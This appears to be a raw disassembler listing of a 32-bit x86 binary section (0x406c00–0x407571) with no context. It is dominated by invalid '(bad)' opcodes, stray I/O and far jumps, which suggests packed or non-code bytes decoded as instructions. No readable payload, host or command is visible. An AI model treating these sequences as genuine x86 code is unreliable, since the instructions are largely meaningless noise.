  406c00:	xchg   ebp,eax
  406c01:	(bad)  
  406c03:	leave  
  406c04:	xchg   edx,eax
  406c05:	call   WORD PTR [ebx+ebx*8-0x32]
  406c0a:	imul   eax,DWORD PTR [eax],0x413568f8
  406c10:	pusha  
  406c11:	dec    edx
  406c12:	cli    
  406c13:	xor    eax,0x35fefc11
  406c18:	std    
  406c19:	add    al,0x41
  406c1b:	add    al,bh
  406c1d:	outs   dx,BYTE PTR ds:[esi]
  406c1e:	ret    0xd7ff
  406c21:	push   0xffffffbf
  406c23:	je     0x406c52
  406c25:	push   edx
  406c26:	(bad)  
  406c27:	jne    0x406c49
  406c29:	fbstp  TBYTE PTR [esp+ecx*1+0x50]
  406c2d:	fnsave [eax+ecx*1-0x58]
  406c31:	scas   eax,DWORD PTR es:[edi]
  406c32:	in     al,0xff
  406c34:	xchg   ecx,ecx
  406c36:	fnstsw WORD PTR [edi+0x69de87]
  406c3c:	cmp    BYTE PTR [edi+0x35],ah
  406c3f:	inc    ecx
  406c40:	loopne 0x406c8b
  406c42:	cli    
  406c43:	xor    eax,0x2680191
	...
  406c5c:	rol    BYTE PTR [ecx],1
  406c5e:	sub    al,0x80
  406c61:	mov    edi,0xc1cbfffe
  406c66:	jae    0x406c7d
  406c68:	mov    al,ds:0x71074de
  406c6d:	jo     0x406c7a
  406c6f:	push   eax
  406c70:	addr16 jo 0x406c7a
  406c73:	call   0x3f319b
  406c78:	dec    eax
  406c79:	mov    ?,WORD PTR [edi+0x660e39ff]
  406c7f:	jne    0x406caa
  406c81:	imul   bh
  406c83:	or     esp,DWORD PTR [ecx]
  406c85:	push   0x6639412f
  406c8a:	out    dx,eax
  406c8b:	pop    es
  406c8c:	xchg   ecx,eax
  406c8d:	and    eax,0x2076ff5f
  406c92:	inc    ecx
  406c93:	or     al,0x39
  406c95:	and    al,0x79
  406c97:	in     al,dx
  406c98:	mov    edx,0x396a689b
  406c9d:	sar    ecx,0xfe
  406ca0:	int3   
  406ca1:	pop    esi
  406ca2:	pop    ebx
  406ca3:	mov    esi,0x89653e8d
  406ca8:	cld    
  406ca9:	mov    ds:0x3e3effdc,al
  406cae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406caf:	push   0xffc26c15
  406cb4:	das    
  406cb5:	add    al,0xfc
  406cb7:	out    0x99,eax
  406cb9:	xchg   BYTE PTR [ebp-0x1],ah
  406cbc:	xchg   ecx,eax
  406cbd:	pop    eax
  406cbe:	add    ebp,edi
	...
  406cd4:	xlat   BYTE PTR ds:[ebx]
  406cd5:	(bad)  
  406cd6:	pop    esp
  406cd7:	xor    eax,0x75645778
  406cdc:	xor    DWORD PTR [edi-0x1201014a],ecx
  406ce2:	fs jne 0x406cda
  406ce5:	aad    0xee
  406ce7:	pop    es
  406ce8:	loope  0x406d12
  406cea:	test   al,0xff
  406cec:	out    0x2f,al
  406cee:	inc    edx
  406cef:	add    al,0x39
  406cf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cf2:	js     0x406ce0
  406cf4:	mov    eax,0xcef74c1a
  406cf9:	mov    ebp,0x86c54576
  406cfe:	fs jne 0x406d2e
  406d01:	cs das 
  406d03:	jne    0x406d65
  406d05:	cwde   
  406d06:	add    ebp,eax
  406d08:	(bad)  
  406d09:	push   DWORD PTR [edi+0x4]
  406d0c:	cmp    ecx,edi
  406d0e:	sub    ch,dh
  406d10:	mov    ch,0x47
  406d12:	call   0xa47da61a
  406d17:	imul   edi,DWORD PTR [ecx],0x0
  406d1a:	jmp    0xf4faeb22
  406d1f:	fs ss add cl,ch
  406d23:	fnstenv [esi-0x2a]
  406d26:	call   0xe916dc04
  406d2b:	jbe    0x406d29
  406d2d:	imul   edi,DWORD PTR [ecx],0x77
  406d30:	mov    ah,0x6b
  406d32:	fisub  WORD PTR [esi+edx*2-0x31]
  406d36:	int    0xee
	...
  406d4c:	inc    esi
  406d4d:	fs cmp al,0x68
  406d50:	push   ecx
  406d51:	fcom   QWORD PTR [edi+0x3]
  406d54:	cmp    ecx,edi
  406d56:	test   al,0xef
  406d58:	cmp    eax,0x39025259
  406d5d:	add    BYTE PTR [ecx],dl
  406d5f:	pop    esi
  406d60:	push   ecx
  406d61:	shr    eax,0x64
  406d64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d65:	hlt    
  406d66:	cmp    BYTE PTR [ecx-0x5],0x63
  406d6a:	mov    ss,ebx
  406d6c:	ret    
  406d6d:	push   eax
  406d6e:	je     0x406dee
  406d70:	or     eax,0x69647e6c
  406d75:	into   
  406d76:	sub    cl,0xf8
  406d79:	arpl   WORD PTR [esi+0x7a],bp
  406d7c:	mov    ah,0x70
  406d7e:	pop    esi
  406d7f:	fs out 0x58,al
  406d82:	cmp    DWORD PTR [ebp+0x3c363de],esp
  406d88:	popa   
  406d89:	fcom   DWORD PTR [esi]
  406d8b:	ret    
  406d8c:	into   
  406d8d:	bound  edi,QWORD PTR [ebx+esi*2-0x32]
  406d91:	arpl   WORD PTR [esi],di
  406d93:	fs add al,0xed
  406d96:	(bad)  
  406d97:	(bad)  
  406d98:	jp     0x406dfd
  406d9a:	out    0x19,eax
  406d9c:	sti    
  406d9d:	(bad)  
  406d9e:	push   DWORD PTR [eax+0x27]
  406da1:	pop    esp
  406da2:	neg    DWORD PTR [esi]
  406da4:	adc    eax,0xa080ffd6
  406da9:	sub    eax,0xad15e941
  406dae:	lock inc BYTE PTR [eax]
	...
  406dc1:	add    BYTE PTR [eax],al
  406dc3:	add    BYTE PTR [edx],bl
  406dc5:	arpl   di,di
  406dc7:	mov    ah,0x8f
  406dc9:	sbb    BYTE PTR [ecx-0x17],al
  406dcc:	adc    ch,BYTE PTR [esi+0x78daeec1]
  406dd2:	test   ebp,edx
  406dd4:	add    ah,BYTE PTR [ebx-0x1]
  406dd7:	push   ebx
  406dd8:	xor    eax,0x7c1f70d8
  406ddd:	arpl   si,di
  406ddf:	xchg   esp,eax
  406de0:	in     eax,0x6a
  406de2:	inc    esi
  406de4:	fisubr DWORD PTR [esi*2-0x189c8bf0]
  406deb:	pop    ebp
  406dec:	jl     0x406e51
  406dee:	jmp    DWORD PTR [eax-0x40]
  406df1:	push   edi
  406df2:	mul    DWORD PTR [esi+0x10ffd69a]
  406df8:	mov    dh,0x29
  406dfa:	inc    ecx
  406dfb:	jmp    0x97311b9b
  406e00:	call   0x4117:0xe1bcff63
  406e07:	jmp    0x7701589e
  406e0c:	pop    edx
  406e0d:	jns    0x406d94
  406e0f:	mov    DWORD PTR [edx-0x4f8b009d],edx
  406e15:	inc    edi
  406e16:	neg    DWORD PTR [esi+0x5a]
  406e19:	shl    BYTE PTR [edi+0x64],1
  406e1c:	xor    eax,ecx
  406e1e:	dec    DWORD PTR [ebp-0x50]
  406e21:	outs   dx,DWORD PTR ds:[esi]
  406e22:	test   DWORD PTR [eax],0x35fedf7f
	...
  406e3c:	test   DWORD PTR [ebx],edx
  406e3e:	inc    ecx
  406e3f:	add    al,bh
  406e41:	stos   BYTE PTR es:[edi],al
  406e42:	sar    bh,0x5f
  406e45:	repz mov edi,0xbd7b3974
  406e4b:	fadd   DWORD PTR [edi-0x21]
  406e4e:	inc    BYTE PTR [esi*4-0x10cf0192]
  406e55:	js     0x406e33
  406e57:	idiv   DWORD PTR [edi]
  406e59:	fisttp WORD PTR [edi-0x18]
  406e5c:	jo     0x406dfe
  406e5e:	(bad)  
  406e5f:	(bad)  
  406e60:	cmp    ebp,DWORD PTR [eax+0xa]
  406e63:	shl    ah,0xf8
  406e66:	dec    edi
  406e67:	call   0x400ed0
  406e6c:	xchg   edi,eax
  406e6d:	ja     0x406e4b
  406e6f:	imul   DWORD PTR [edi-0x23]
  406e72:	adc    al,0x0
  406e74:	pusha  
  406e75:	inc    BYTE PTR [edx-0x13a8b43]
  406e7b:	call   DWORD PTR [eax+0x4a]
  406e7e:	sub    DWORD PTR fs:[ebp-0x2000092f],0xfffffffd
  406e86:	jae    0x406ee4
  406e88:	xchg   ebx,eax
  406e89:	mov    al,ds:0xdebff7e8
  406e8e:	push   DWORD PTR [ebx+0x53]
  406e91:	push   esp
  406e92:	(bad)  
  406e93:	dec    DWORD PTR [edi+0x875ff9f]
  406e99:	(bad)  
  406e9a:	push   0xffffffba
  406e9c:	jg     0x406e7c
  406e9e:	(bad)  
  406e9f:	mov    ch,0x0
	...
  406eb1:	add    BYTE PTR [eax],al
  406eb3:	add    BYTE PTR [esi+eax*8+0x485ffffe],bh
  406eba:	pop    es
  406ebb:	call   0x3ff25f
  406ec0:	jg     0x406e4a
  406ec2:	call   0x620aa8be
  406ec7:	inc    DWORD PTR [edi+ebx*2+0x6b]
  406ecb:	mov    cl,0x83
  406ecd:	mov    edx,0xbb84ff61
  406ed2:	pop    ecx
  406ed3:	push   DWORD PTR [esi-0x5ef827d6]
  406ed9:	jbe    0x406e78
  406edb:	jmp    DWORD PTR [esi-0x591f67e6]
  406ee1:	add    ah,BYTE PTR [edx-0x1]
  406ee4:	or     al,0x5f
  406ee6:	imul   edx,DWORD PTR [ebp-0x9e0d2d],0xffffffcc
  406eed:	sbb    ebx,DWORD PTR [edx-0x1]
  406ef0:	jle    0x406f54
  406ef2:	xlat   BYTE PTR ds:[ebx]
  406ef3:	pop    es
  406ef4:	popa   
  406ef5:	xor    al,0x9d
  406ef7:	jmp    FWORD PTR [esi+0x52]
  406efa:	xchg   edi,eax
  406efb:	in     al,0x6e
  406efd:	pop    edx
  406efe:	popa   
  406eff:	call   0xffa1f3cc
  406f04:	push   esi
  406f05:	test   BYTE PTR [eax-0x9],dh
  406f08:	dec    esi
  406f09:	xor    ch,BYTE PTR [esi+eax*4-0x7c]
  406f0d:	cmp    ah,BYTE PTR [ecx-0x1]
  406f10:	test   BYTE PTR [edi+0x59],cl
  406f13:	push   DWORD PTR [esi]
  406f15:	aas    
  406f16:	fnstsw WORD PTR [eax+eax*1+0x0]
	...
  406f29:	add    BYTE PTR [eax],al
  406f2b:	add    BYTE PTR [esi],ch
  406f2d:	xchg   edx,eax
  406f2e:	popa   
  406f2f:	mov    ch,0x19
  406f31:	and    BYTE PTR [ecx-0x1],0x11
  406f35:	pop    es
  406f36:	lahf   
  406f37:	call   DWORD PTR [esi]
  406f39:	mov    dl,BYTE PTR [edi+0x617206f0]
  406f3f:	call   0xffa12be0
  406f44:	(bad)  
  406f45:	sbb    ebx,DWORD PTR [ecx+ebp*8+0x2e]
  406f49:	jmp    0x6c2f6eae
  406f4e:	pop    edi
  406f4f:	call   0x4b66eea
  406f54:	cmp    DWORD PTR [edi],esi
  406f56:	sub    ecx,DWORD PTR [ecx+edi*1]
  406f59:	retf   
  406f5a:	popa   
  406f5b:	jo     0x406f17
  406f5d:	cmp    edx,DWORD PTR [ecx-0x12]
  406f60:	(bad)  
  406f61:	(bad)  
  406f62:	icebp  
  406f63:	pusha  
  406f64:	inc    esp
  406f65:	clc    
  406f66:	push   eax
  406f67:	f2xm1  
  406f69:	pusha  
  406f6a:	ss mov esi,esp
  406f6d:	arpl   WORD PTR [edi+eax*8-0x52],bx
  406f71:	iret   
  406f72:	nop
  406f73:	cs addr16 mov edi,0x2a31ebe8
  406f7a:	test   al,0x3
  406f7c:	mov    gs,WORD PTR [edx]
  406f7e:	xchg   esp,eax
  406f7f:	sub    bh,al
  406f81:	call   DWORD PTR [eax]
  406f83:	sbb    eax,0xcfe6079
  406f88:	jns    0x406f75
  406f8a:	fnsave [ebx+0x70e8fed6]
	...
  406fa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fa5:	pusha  
  406fa6:	pop    esp
  406fa7:	pop    esp
  406fa8:	or     DWORD PTR [ecx+0x54],esp
  406fab:	or     al,0x61
  406fad:	popf   
  406fae:	mov    bh,0x60
  406fb0:	dec    esi
  406fb1:	push   edi
  406fb2:	loope  0x406f52
  406fb4:	inc    esi
  406fb5:	pusha  
  406fb6:	je     0x406f7e
  406fb8:	inc    esi
  406fb9:	iret   
  406fba:	push   eax
  406fbb:	and    BYTE PTR [edi-0x3f],ch
  406fbe:	call   0x2856c1ae
  406fc3:	add    al,0x26
  406fc5:	push   ss
  406fc6:	sbb    al,0x2b
  406fc8:	js     0x406fca
  406fca:	xchg   ecx,eax
  406fcb:	or     cl,bh
  406fcd:	pop    edi
  406fce:	xchg   esi,eax
  406fcf:	or     al,0xf9
  406fd1:	aam    0xf5
  406fd3:	mov    bl,0x9e
  406fd5:	add    ch,cl
  406fd7:	jo     0x406f98
  406fd9:	pop    edi
  406fda:	hlt    
  406fdb:	pop    ebx
  406fdc:	mov    DWORD PTR [edi+0x0],ebx
  406fdf:	cld    
  406fe0:	inc    edx
  406fe1:	push   0x5f598f6e
  406fe6:	call   0xffa02e28
  406feb:	rol    DWORD PTR [esi],1
  406fed:	push   ss
  406fee:	inc    ecx
  406fef:	jmp    0x4148454d
  406ff4:	loope  0x407052
  406ff6:	inc    DWORD PTR [esi+0x59]
  406ff9:	aad    0xfb
  406ffb:	pop    DWORD PTR ds:[edi]
  406ffe:	call   0xffa03cf6
  407003:	and    ah,bh
  407005:	add    eax,DWORD PTR [eax]
  407007:	mov    esp,0x0
	...
  40701c:	lods   eax,DWORD PTR ds:[esi]
  40701d:	ins    BYTE PTR es:[edi],dx
  40701e:	and    DWORD PTR ds:0x16ff5756,0xb9fbc5bf
  407028:	sbb    ebp,edx
  40702a:	or     eax,DWORD PTR [esi]
  40702c:	daa    
  40702d:	aad    0x28
  40702f:	test   al,0x3a
  407031:	push   0x3a67fd
  407036:	or     ebp,DWORD PTR [ecx]
  407038:	dec    ecx
  407039:	test   ecx,eax
  40703b:	call   0x2507707a
  407040:	cmc    
  407041:	(bad)  
  407042:	(bad)  
  407043:	call   0xd585b782
  407048:	out    0x6,al
  40704a:	add    cl,ch
  40704c:	push   eax
  40704d:	pop    edi
  40704e:	imul   ebp,ecx,0xe9695f20
  407054:	leave  
  407055:	(bad)  
  407056:	repz sbb eax,ecx
  407059:	test   ah,dh
  40705b:	sahf   
  40705c:	jle    0x4070bd
  40705e:	push   eax
  40705f:	sahf   
  407060:	lock push esi
  407062:	call   FWORD PTR [ecx+ebx*4]
  407065:	push   0x3d5fcf
  40706a:	or     eax,DWORD PTR [eax]
  40706c:	shl    BYTE PTR [edi],1
  40706e:	add    al,0xe9
  407070:	pop    esp
  407071:	add    eax,0xe6380000
  407076:	daa    
  407077:	inc    ecx
  407078:	sar    BYTE PTR [ebp-0x4d77f38c],1
  40707e:	mov    esi,0xff
	...
  407093:	add    BYTE PTR [edi-0x6c],dh
  407096:	mov    dl,al
  407098:	push   ebp
  407099:	mov    esp,esi
  40709b:	div    DWORD PTR [edi-0x41]
  40709e:	dec    edi
  40709f:	push   edx
  4070a0:	push   0x77ffbee2
  4070a5:	lea    eax,[ebp-0x1409010]
  4070ab:	call   0x3fef58
  4070b0:	retf   0x6802
  4070b3:	test   eax,0xfeff436e
  4070b8:	in     eax,dx
  4070b9:	mov    bl,0xf6
  4070bb:	push   DWORD PTR [edi]
  4070bd:	mov    edi,0x43697534
  4070c2:	jmp    edi
  4070c4:	js     0x407143
  4070c6:	(bad)  
  4070c7:	(bad)  
  4070c8:	(bad)  [eax-0x42a8081c]
  4070ce:	imul   eax,DWORD PTR [eax],0x4135d208
  4070d4:	pusha  
  4070d5:	mov    ebp,0xbd6ff0b4
  4070da:	(bad)  
  4070db:	jmp    FWORD PTR ds:0x50412839
  4070e1:	jmp    0x8588:0xbef7bf19
  4070e8:	hlt    
  4070e9:	mov    dh,0xfe
  4070eb:	(bad)  
  4070ec:	jp     0x4070f2
  4070ee:	push   0xff44fe9b
  4070f3:	(bad)  
  4070f4:	ins    DWORD PTR es:[edi],dx
  4070f5:	mov    cl,0xf6
  4070f7:	inc    DWORD PTR [eax]
	...
  407109:	add    BYTE PTR [eax],al
  40710b:	add    BYTE PTR [ecx],bh
  40710d:	jbe    0x40716d
  40710f:	xor    eax,0xffc4408c
  407114:	push   ss
  407115:	test   BYTE PTR [ebp-0x782f0901],bl
  40711b:	loopne 0x407103
  40711d:	(bad)  
  40711e:	pop    ebp
  40711f:	push   0x39
  407121:	jmp    DWORD PTR [ebx+0x5e677836]
  407127:	mov    ch,0xc9
  407129:	mov    dh,0x5d
  40712b:	dec    esi
  40712d:	cld    
  40712e:	fsubr  DWORD PTR [eax]
  407130:	js     0x407199
  407132:	imul   ebx,esi,0x7f
  407135:	(bad)  
  407136:	pop    ebp
  407137:	mov    DWORD PTR [edi+ebp*4+0x41aeff55],edi
  40713e:	add    ebp,DWORD PTR [eax-0x15]
  407141:	push   ebp
  407142:	(bad)  
  407143:	call   FWORD PTR [edi-0x6908ad44]
  407149:	(bad)  
  40714a:	pop    ebp
  40714b:	xor    eax,0xffc44004
  407150:	sahf   
  407151:	daa    
  407152:	popf   
  407153:	(bad)  
  407154:	jle    0x407126
  407156:	xchg   esp,ebx
  407158:	outs   dx,BYTE PTR ds:[esi]
  407159:	pop    esi
  40715a:	pop    ebp
  40715b:	sub    DWORD PTR [ebx+ecx*1+0x6766ff56],0xffffffd7
  407163:	fs mov edx,0x56f770a4
  407169:	ds add al,0x74
  40716c:	in     eax,dx
  40716d:	jmp    0x415a10
	...
  407182:	add    BYTE PTR [eax],al
  407184:	dec    esi
  407185:	dec    esi
  407186:	pop    ebp
  407187:	add    ch,al
  407189:	stc    
  40718a:	jmp    0x40718b
  40718c:	ss dec esi
  40718e:	sahf   
  40718f:	jmp    DWORD PTR [edi+ebx*2-0x521efc95]
  407196:	pop    ebp
  407197:	jmp    esp
  407199:	call   DWORD PTR [ebp+edx*2-0x2861a2ea]
  4071a0:	ss push 0x5d069c3e
  4071a6:	mov    ss,WORD PTR [edi+0x5d865511]
  4071ac:	not    dl
  4071ae:	lock imul eax,DWORD PTR [eax-0x19a28968],0xffffff92
  4071b6:	test   DWORD PTR [ebp-0x22],edx
  4071b9:	pop    esp
  4071ba:	data16 xlat BYTE PTR ds:[ebx]
  4071bc:	ds push 0x5cce9c22
  4071c2:	push   esi
  4071c3:	xchg   edi,eax
  4071c4:	fst    DWORD PTR [esi+ecx*2+0x5d]
  4071c8:	mov    esi,0x646bf0d2
  4071cd:	cwde   
  4071ce:	ds pop ebp
  4071d0:	scas   al,BYTE PTR es:[edi]
  4071d1:	xchg   edx,eax
  4071d2:	adc    eax,0x2e5ca655
  4071d7:	xlat   BYTE PTR ds:[ebx]
  4071d8:	ss push 0x5c969c06
  4071de:	push   ds
  4071df:	xchg   edi,eax
  4071e0:	xchg   ebp,eax
  4071e1:	push   esp
  4071e2:	push   ss
  4071e3:	pop    ebp
  4071e4:	xchg   ecx,eax
  4071e5:	es push edx
  4071e7:	pop    ebp
	...
  4071fc:	jle    0x40725a
  4071fe:	cmp    al,0x70
  407200:	outs   dx,BYTE PTR ds:[esi]
  407201:	pop    esp
  407202:	(bad)  
  407203:	imul   ecx,DWORD PTR [edi-0x67],0xfffffff6
  407207:	pop    esp
  407208:	xchg   dx,ax
  40720a:	add    DWORD PTR [ebp+0x5e],edx
  40720d:	pop    esp
  40720e:	shl    eax,1
  407210:	xchg   ebx,eax
  407211:	pop    esp
  407212:	ficomp WORD PTR [esp+eax*4+0x5f]
  407216:	ficomp WORD PTR [esi+eax*2+0x67]
  40721a:	loope  0x4071b4
  40721c:	ds pop esp
  40721e:	(bad)  
  40721f:	xchg   esi,eax
  407220:	adc    eax,0x215cbe54
  407225:	pop    esi
  407226:	add    BYTE PTR [ebx-0x7b],dh
  407229:	pop    ebx
  40722a:	push   DWORD PTR [edx+ecx*4+0x53]
  40722e:	jmp    DWORD PTR [esi-0x6ef82a8b]
  407234:	and    eax,0x6596ff5a
  407239:	xchg   ebp,eax
  40723a:	lock xchg esi,eax
  40723c:	pop    ebp
  40723d:	pop    ebx
  40723e:	call   0xff9c42d0
  407243:	jle    0x40723c
  407245:	push   ebx
  407246:	jmp    0xff9bf972
  40724b:	outs   dx,BYTE PTR ds:[esi]
  40724c:	pop    es
  40724d:	pop    eax
  40724e:	call   0x41386a
  407253:	xor    BYTE PTR [eax+0x8],bh
  407256:	add    BYTE PTR [ecx+esi*4+0x5e25836c],bh
  40725d:	out    0xff,al
  40725f:	rol    BYTE PTR [eax],cl
	...
  407271:	add    BYTE PTR [eax],al
  407273:	add    BYTE PTR [esi+0x5b],al
  407276:	jne    0x407269
  407278:	and    dl,BYTE PTR [edx-0x49]
  40727b:	ss add eax,0x922d4589
  407281:	popf   
  407282:	ss test al,0x3a
  407285:	pop    ebx
  407286:	jne    0x407279
  407288:	and    dl,BYTE PTR [edx-0x3]
  40728b:	push   ss
  40728c:	in     eax,0x5a
  40728e:	jne    0x40729d
  407290:	fst    st(4)
  407292:	pop    es
  407293:	adc    DWORD PTR [ebx],ebx
  407295:	cwde   
  407296:	(bad)  
  407297:	inc    BYTE PTR [eax]
  407299:	ds add al,0xe9
  40729c:	scas   eax,DWORD PTR es:[edi]
  40729d:	xchg   ah,ch
  40729f:	push   0xe6f72ff6
  4072a4:	repnz mov WORD PTR [ebp-0x23],es
  4072a8:	test   DWORD PTR [edx+0x75],ebx
  4072ab:	in     eax,0xe3
  4072ad:	adc    al,0x75
  4072af:	add    BYTE PTR [ebx+ebx*2-0x19],dh
  4072b3:	add    BYTE PTR [eax+ecx*4],al
  4072b6:	add    BYTE PTR [eax],al
  4072b8:	sub    edi,DWORD PTR [edi+0x52a850e]
  4072be:	add    BYTE PTR [eax],al
  4072c0:	xlat   BYTE PTR ds:[ebx]
  4072c1:	inc    eax
  4072c2:	test   DWORD PTR [eax],0xc6ffff20
  4072c8:	push   ebp
  4072c9:	mov    al,0xfe
  4072cb:	pop    es
  4072cc:	adc    bh,bh
  4072ce:	imul   eax,DWORD PTR [eax],0x6a043a
  4072d4:	dec    edx
  4072d5:	add    al,0x8d
  4072d7:	inc    ebp
	...
  4072ec:	fs xchg esp,eax
  4072ee:	mov    WORD PTR [ebp-0x1509c],es
  4072f4:	inc    eax
  4072f5:	mov    bh,0x74
  4072f7:	clc    
  4072f8:	pop    edi
  4072f9:	xor    ebx,edi
  4072fb:	call   0x40faa6
  407300:	fstp   TBYTE PTR [esi-0x4686fa8d]
  407306:	add    BYTE PTR [eax],al
  407308:	mov    al,ds:0xe128e566
  40730d:	(bad)  
  40730e:	(bad)  
  40730f:	jne    0x4072ad
  407311:	out    0xd8,al
  407313:	mov    ebp,0xd08ab74f
  407318:	or     eax,0x2ff7f481
  40731d:	mov    bh,0x4f
  40731f:	push   edx
  407320:	cmp    BYTE PTR [esi-0x43],dl
  407323:	jmp    FWORD PTR [edi]
  407325:	lea    eax,[ebp-0x14a8810]
  40732b:	push   0x60
  40732d:	sbb    WORD PTR [edi],si
  407330:	xchg   ecx,eax
  407331:	(bad)  
  407332:	(bad)  
  407333:	mov    ch,0x60
  407335:	lods   eax,DWORD PTR ds:[esi]
  407336:	(bad)  
  407337:	call   FWORD PTR [edi-0x11]
  40733a:	je     0x407365
  40733c:	and    DWORD PTR [eax+ebp*8],eax
  40733f:	and    eax,0xff5a7439
  407344:	mov    al,0xe3
  407346:	pop    esi
  407347:	div    DWORD PTR [esi]
  407349:	inc    ebx
  40734a:	in     eax,dx
  40734b:	call   DWORD PTR [esi+0x41124e]
	...
  407361:	add    BYTE PTR [eax],al
  407363:	add    BYTE PTR [ecx],bh
  407365:	xchg   edx,eax
  407366:	nop
  407367:	lock es stos DWORD PTR es:[edi],eax
  40736a:	pop    edx
  40736b:	dec    DWORD PTR [esp+edi*8+0x2c]
  40736f:	inc    ecx
  407370:	cmp    DWORD PTR [edi+0x2],ebp
  407373:	mov    ebp,0x858c7306
  407378:	or     eax,0x63ff5a73
  40737d:	addr16 jmp 0x40738f
  407380:	sub    BYTE PTR es:[edi+edi*8],al
  407384:	lods   al,BYTE PTR ds:[esi]
  407385:	xlat   BYTE PTR ds:[ebx]
  407386:	push   ecx
  407387:	(bad)  
  407388:	fsubp  st(2),st
  40738a:	pcmpeqw mm4,QWORD PTR [eax]
  40738d:	test   al,0x3
  40738f:	call   0xff9aef74
  407394:	mov    al,0xec
  407396:	push   0xfffffff7
  407398:	mov    esi,0x1effecca
  40739d:	adc    al,BYTE PTR fs:[ecx+0x39]
  4073a1:	sbb    dl,BYTE PTR [eax+0x5a12aef0]
  4073a7:	jmp    DWORD PTR [esp+edx*4+0x2c]
  4073ab:	inc    ecx
  4073ac:	cmp    edi,ebp
  4073ae:	dec    ebp
  4073af:	mov    esp,0x858bfa8e
  4073b4:	cdq    
  4073b5:	cli    
  4073b6:	pop    ecx
  4073b7:	jmp    FWORD PTR [esp+eiz*8+0x276f72e]
  4073be:	mov    bl,0x67
  4073c0:	inc    esp
  4073c1:	xchg   edx,eax
  4073c2:	(bad)  
  4073c3:	jmp    DWORD PTR [edi+0x1c]
  4073c6:	push   ebx
  4073c7:	test   DWORD PTR [eax],0x0
	...
  4073d9:	add    BYTE PTR [eax],al
  4073db:	add    BYTE PTR [esi+0x6a],bl
  4073de:	pop    ecx
  4073df:	xor    eax,0xc30fffcc
  4073e4:	dec    esi
  4073e5:	popa   
  4073e6:	xchg   ecx,eax
  4073e7:	cwde   
  4073e8:	inc    esi
  4073e9:	pop    ecx
  4073ea:	loop   0x40742f
  4073ec:	(bad)
  4073ef:	xchg   edi,eax
  4073f0:	or     eax,0x3559c651
  4073f5:	rcr    eax,cl
  4073f7:	pop    eax
  4073f8:	imul   ecx,DWORD PTR [ecx+0x5926386c],0xd31eb4ae
  407402:	pop    edi
  407403:	pop    ecx
  407404:	push   cs
  407405:	gs cmc 
  407407:	or     al,0xf9
  407409:	shr    esi,cl
  40740b:	mov    bl,0x16
  40740d:	out    0x4f,eax
  40740f:	pop    ecx
  407410:	test   BYTE PTR [eax+0x6c],0x38
  407414:	out    0x58,al
  407416:	jle    0x407407
  407418:	out    0x58,al
  40741a:	jmp    0x767028a5
  40741f:	pop    ecx
  407420:	(bad)  
  407421:	scas   eax,DWORD PTR es:[edi]
  407422:	shl    BYTE PTR ds:0x58e8bf06,1
  407428:	mov    WORD PTR [edi+0x5e],cs
  40742b:	pop    ecx
  40742c:	mov    esi,0x61cf1458
  407431:	mov    edi,0x9c136be8
  407436:	ds pop ecx
  407438:	mov    al,0x82
  40743a:	adc    DWORD PTR [ecx-0x62],edx
  40743d:	pop    eax
  40743e:	push   0xffffff97
	...
  407454:	popf   
  407455:	push   eax
  407456:	es pop ecx
  407458:	cmp    DWORD PTR [ecx],ecx
  40745a:	gs jge 0x407496
  40745d:	add    cl,ch
  40745f:	test   BYTE PTR [ebx+ebp*2-0x89a6ea],bh
  407466:	cmc    
  407467:	jg     0x407428
  407469:	(bad)  
  40746a:	call   0xdb2e72
  40746f:	add    DWORD PTR [eax],ecx
  407471:	pop    ecx
  407472:	(bad)  
  407473:	jmp    0xe9c1f8b9
  407478:	cmp    al,BYTE PTR [eax]
  40747a:	push   0xbe693af9
  40747f:	(bad)  
  407480:	outs   dx,DWORD PTR ds:[esi]
  407481:	add    al,ch
  407483:	js     0x40744c
  407485:	push   edi
  407486:	inc    esi
  407488:	mov    edi,0x81bef764
  40748d:	push   edi
  40748e:	jne    0x407471
  407490:	xchg   edx,eax
  407491:	pop    ebp
  407492:	mov    ch,0xae
  407494:	jno    0x4074ed
  407496:	mov    ch,0x91
  407498:	imul   edx,DWORD PTR [edi-0x1],0xe7fff79e
  40749f:	mov    esi,0x8eff57af
  4074a4:	(bad)  
  4074a5:	pop    esp
  4074a6:	test   DWORD PTR [esi-0xe8aa86f],0x76b54952
  4074b0:	adc    DWORD PTR [edi-0x4b],0xff57698d
  4074b7:	data16 add BYTE PTR [eax],al
	...
  4074ca:	add    BYTE PTR [eax],al
  4074cc:	(bad)  
  4074cd:	jmp    edi
  4074cf:	shl    BYTE PTR [edi-0x50a900a9],0x60
  4074d6:	test   DWORD PTR [esi+0x11],0x22f17557
  4074dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074de:	mov    ch,0x3e
  4074e0:	add    DWORD PTR [ebx+0x570911bd],eax
  4074e6:	(bad)  
  4074e7:	jmp    0x64c36f72
  4074ec:	dec    edx
  4074ed:	dec    edi
  4074ee:	call   FWORD PTR [esi]
  4074f0:	xchg   ah,cl
  4074f2:	adc    DWORD PTR [edx-0x1],esp
  4074f5:	aaa    
  4074f6:	test   DWORD PTR [esi],0x305711
  4074fc:	aaa    
  4074fd:	inc    esi
  4074fe:	pop    es
  4074ff:	call   0x3ffb8d
  407504:	cmp    eax,DWORD PTR ds:0x4567006a
  40750a:	pop    es
  40750b:	call   0x3fe645
  407510:	addr16 jno 0x4074f7
  407513:	mul    DWORD PTR [edi-0x51]
  407516:	out    0x89,eax
  407518:	enter  0xfeae,0xff
  40751c:	lods   eax,DWORD PTR ds:[esi]
  40751d:	call   0xe4287518
  407522:	jge    0x4074dc
  407524:	out    0xae,eax
  407526:	(bad)  
  407527:	mov    ch,0xf8
  407529:	(bad)  
  40752a:	(bad)  
  40752b:	jmp    FWORD PTR [eax+0xffb732]
	...
  407541:	add    BYTE PTR [eax],al
  407543:	add    BYTE PTR [edi-0x601f4b52],ah
  407549:	scas   al,BYTE PTR es:[edi]
  40754a:	(bad)  
  40754b:	call   0x3fe988
  407550:	mov    bh,0x70
  407552:	fdiv   st,st(7)
  407554:	scas   eax,DWORD PTR es:[di]
  407556:	out    0x5d,eax
  407558:	sub    BYTE PTR [edi-0x53f20002],ch
  40755e:	idiv   bh
  407560:	push   edi
  407561:	in     al,0x51
  407563:	mov    eax,0x45feaf67
  407568:	push   0x7fdd4e5
  40756d:	scas   eax,DWORD PTR es:[edi]
  40756e:	(bad)  
  40756f:	jne    0x407565
  407571:	jecxz  0x40750e
